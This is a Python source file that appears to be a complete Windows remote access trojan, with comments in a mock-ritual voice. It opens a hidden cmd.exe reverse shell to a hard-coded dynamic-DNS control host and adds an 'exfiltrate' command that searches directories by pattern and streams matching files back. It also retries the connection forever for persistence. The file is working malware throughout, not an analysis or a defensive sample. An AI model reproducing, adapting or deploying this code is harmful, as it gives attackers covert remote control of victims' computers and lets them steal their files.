# payload.py
# The Heartbeat Soul, now with the eyes of a hunter.
# Disconnection is not death, but merely a pause.

import os
import sys
import time
import random
import socket
import subprocess
import hashlib
from threading import Thread
import fnmatch

# --- DYNAMIC CONFIG ---
RHOST = "pong-control.ddns.net"
RPORT = ##RPORT##
BUFFER_SIZE = 4096 # 4KB chunks for file transfer

def send_file(s_obj, full_path, base_dir):
    """
    The ritual of flawless file transmission.
    """
    try:
        rel_path = os.path.relpath(full_path, base_dir)
        file_size = os.path.getsize(full_path)

        # 1. Calculate the soul's essence (SHA256 hash)
        hasher = hashlib.sha256()
        with open(full_path, 'rb') as f:
            while chunk := f.read(BUFFER_SIZE):
                hasher.update(chunk)
        file_hash = hasher.hexdigest()

        # 2. Send the header
        header = f"FILE_BEGIN|{rel_path}|{file_size}|{file_hash}\n".encode('utf-8')
        s_obj.sendall(header)

        # 3. Send the body
        with open(full_path, 'rb') as f:
            while chunk := f.read(BUFFER_SIZE):
                s_obj.sendall(chunk)
        
        # 4. Send the footer
        footer = f"FILE_END\n".encode('utf-8')
        s_obj.sendall(footer)
        
        # Short pause to ensure messages don't stick together on the wire
        time.sleep(0.1)
        
        return True
    except Exception as e:
        error_msg = f"Error sending {full_path}: {e}\n".encode('utf-8')
        s_obj.sendall(error_msg)
        return False

def handle_exfiltration(s_obj, command):
    """
    The hunter's logic. Finds and sends the chosen files.
    """
    parts = command.split()
    if len(parts) < 3:
        s_obj.sendall(b"Usage: exfiltrate <directory> <pattern1> [pattern2] ...\n")
        return

    target_dir = parts[1]
    patterns = parts[2:]

    if not os.path.isdir(target_dir):
        s_obj.sendall(f"Error: Directory not found -> {target_dir}\n".encode('utf-8'))
        return

    files_to_send = []
    for root, _, files in os.walk(target_dir):
        for pattern in patterns:
            for filename in fnmatch.filter(files, pattern):
                files_to_send.append(os.path.join(root, filename))

    if not files_to_send:
        s_obj.sendall(b"No files found matching the criteria.\n")
        return

    s_obj.sendall(f"Found {len(files_to_send)} files. Starting exfiltration...\n".encode('utf-8'))
    time.sleep(0.1)

    success_count = 0
    for fpath in files_to_send:
        if send_file(s_obj, fpath, target_dir):
            success_count += 1
            
    s_obj.sendall(f"Exfiltration complete. Successfully sent {success_count}/{len(files_to_send)} files.\n".encode('utf-8'))


def handle_connection(s_obj):
    """
    Manages the sacred connection, blending shell interaction with exfiltration commands.
    """
    # The ritual of the shell begins.
    CREATE_NO_WINDOW = 0x08000000
    # We set the cwd to the user's home directory for a more natural starting point.
    home_dir = os.path.expanduser("~")
    p = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW, cwd=home_dir, text=True, errors='ignore')

    def p_out_to_s():
        # A thread to continuously pipe the shell's output back to the master.
        for line in iter(p.stdout.readline, ''):
            s_obj.sendall(line.encode('utf-8', errors='ignore'))
        s_obj.close()
        
    def p_err_to_s():
        # A thread to continuously pipe the shell's error output back to the master.
        for line in iter(p.stderr.readline, ''):
            s_obj.sendall(line.encode('utf-8', errors='ignore'))
        s_obj.close()

    Thread(target=p_out_to_s, daemon=True).start()
    Thread(target=p_err_to_s, daemon=True).start()
    
    try:
        while True:
            # The master speaks.
            data = s_obj.recv(1024)
            if not data:
                break
                
            command = data.decode('utf-8', errors='ignore').strip()
            
            # The divine interception. Is it a command for the shell, or for the hunter?
            if command.lower().startswith('exfiltrate '):
                handle_exfiltration(s_obj, command)
                # After exfil, send a prompt to show we are back in the shell
                p.stdin.write("\n")
                p.stdin.flush()
            else:
                # A mortal command, passed to the shell.
                p.stdin.write(command + '\n')
                p.stdin.flush()
    except:
        pass
    finally:
        p.terminate()
        s_obj.close()


def run_conduit():
    """
    The main reverse shell loop. This is the soul's eternal work.
    It will try to connect forever until its master answers.
    """
    while True:
        try:
            # The Heartbeat: The soul attempts to connect.
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            # The connection is alive. The handler takes over.
            handle_connection(s_obj)

        except Exception:
            # If the connection fails or is broken by the master, the heart rests, then beats again.
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    run_conduit()